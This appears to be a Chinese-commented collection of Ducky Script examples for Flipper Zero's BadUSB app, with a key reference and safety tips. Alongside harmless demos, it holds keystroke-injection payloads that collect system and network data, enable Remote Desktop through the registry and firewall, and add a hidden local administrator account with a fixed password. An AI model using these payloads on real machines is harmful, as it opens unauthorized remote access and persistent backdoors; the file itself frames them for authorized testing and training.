// ============================================================================
// BadUSB (Ducky Script) 示例集合
// ============================================================================
// 这些脚本可以在 Flipper Zero 的 BadUSB 应用中运行
// 保存为 .txt 文件放入 /badusb/ 目录
// ============================================================================

// ============================================================================
// 示例1: 基础信息收集 (Windows)
// ============================================================================
/*
REM 基础系统信息收集
REM 保存为: info_gather.txt
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING systeminfo > %TEMP%\sysinfo.txt
ENTER
DELAY 2000
STRING ipconfig /all >> %TEMP%\sysinfo.txt
ENTER
DELAY 1000
STRING netstat -an >> %TEMP%\sysinfo.txt
ENTER
DELAY 1000
STRING exit
ENTER
*/

// ============================================================================
// 示例2: 打开记事本输入消息
// ============================================================================
/*
REM 打开记事本并输入消息
REM 保存为: notepad_hello.txt
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING =================================
ENTER
STRING    Hello from Flipper Zero!
ENTER
STRING =================================
ENTER
STRING Device: Flipper Zero
ENTER
STRING Firmware: Momentum
ENTER
STRING Date: 2026-03-27
ENTER
STRING =================================
*/

// ============================================================================
// 示例3: 打开网站
// ============================================================================
/*
REM 打开指定网站
REM 保存为: open_website.txt
DELAY 1000
GUI r
DELAY 500
STRING chrome.exe https://flipperzero.one
ENTER
*/

// ============================================================================
// 示例4: PowerShell 下载执行 (需要修改用于合法用途)
// ============================================================================
/*
REM PowerShell 命令执行示例
REM 保存为: ps_example.txt
REM 注意: 仅用于授权测试!
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1500
STRING Get-Process | Select-Object -First 10
ENTER
DELAY 1000
STRING exit
ENTER
*/

// ============================================================================
// 示例5: macOS 终端命令
// ============================================================================
/*
REM macOS 示例
REM 保存为: macos_demo.txt
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1500
STRING uname -a
ENTER
DELAY 1000
STRING sw_vers
ENTER
*/

// ============================================================================
// 示例6: Linux 终端命令 (Ubuntu)
// ============================================================================
/*
REM Linux 示例
REM 保存为: linux_demo.txt
DELAY 1000
CTRL ALT t
DELAY 1000
STRING lsb_release -a
ENTER
DELAY 1000
STRING uname -a
ENTER
DELAY 1000
STRING neofetch
ENTER
*/

// ============================================================================
// 示例7: Windows 注册表编辑 (谨慎使用!)
// ============================================================================
/*
REM 启用 Windows 远程桌面
REM 保存为: enable_rdp.txt
REM 警告: 仅用于授权管理!
DELAY 1000
GUI r
DELAY 500
STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ENTER
DELAY 1000
STRING netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
ENTER
*/

// ============================================================================
// 示例8: 创建本地用户 (Windows)
// ============================================================================
/*
REM 创建用户账户
REM 保存为: create_user.txt
REM 警告: 仅用于授权测试!
DELAY 1000
GUI r
DELAY 500
STRING net user testuser TestPass123 /add
ENTER
DELAY 1000
STRING net localgroup administrators testuser /add
ENTER
*/

// ============================================================================
// Ducky Script 命令参考
// ============================================================================
/*

REM          - 注释
DELAY ms     - 延迟指定毫秒
DEFAULT_DELAY ms / DELAY ms  - 设置默认延迟
STRING text  - 输入字符串
STRINGLN text - 输入字符串并回车
ENTER        - 回车键
ESCAPE       - ESC键
TAB          - Tab键
SPACE        - 空格键
BACKSPACE / BKSP / BS  - 退格键
DELETE       - Delete键
INSERT       - Insert键
HOME         - Home键
END          - End键
PAGE_UP      - Page Up键
PAGE_DOWN    - Page Down键
PRINTSCREEN  - Print Screen键
SCROLL_LOCK  - Scroll Lock键
PAUSE / BREAK - Pause/Break键
UP / DOWN / LEFT / RIGHT - 方向键

修饰键 (可组合使用):
GUI / WINDOWS / COMMAND  - Win键/Cmd键
SHIFT                    - Shift键
ALT                      - Alt键
CTRL / CONTROL           - Ctrl键

组合示例:
GUI r           - Win+R (运行)
CTRL ALT DELETE - Ctrl+Alt+Del
CTRL SHIFT ESC  - Ctrl+Shift+Esc (任务管理器)
GUI SPACE       - macOS Spotlight
CTRL ALT t      - Linux 打开终端

特殊字符:
使用 STRING 可以输入大多数字符
对于特殊组合键，使用修饰键+按键

*/

// ============================================================================
// 高级示例: 条件执行 (使用扩展语法)
// ============================================================================
/*
REM 等待特定按键
REM 某些固件支持条件执行

REM 检测操作系统类型的示例逻辑:
DELAY 1000
GUI r
DELAY 500
STRING cmd /c "echo %os%"
ENTER
DELAY 1000

REM 如果是Windows会继续执行...
*/

// ============================================================================
// 安全提示
// ============================================================================
/*
1. 仅在自己拥有的设备上测试 BadUSB 脚本
2. 许多防病毒软件会检测 BadUSB 行为
3. 某些企业环境有USB设备白名单
4. 使用这些技术进行未授权访问是违法的
5. 永远不要在生产环境中测试未知脚本

合法使用场景:
- 自动化IT部署
- 渗透测试(有书面授权)
- 安全培训演示
- 个人设备配置
*/
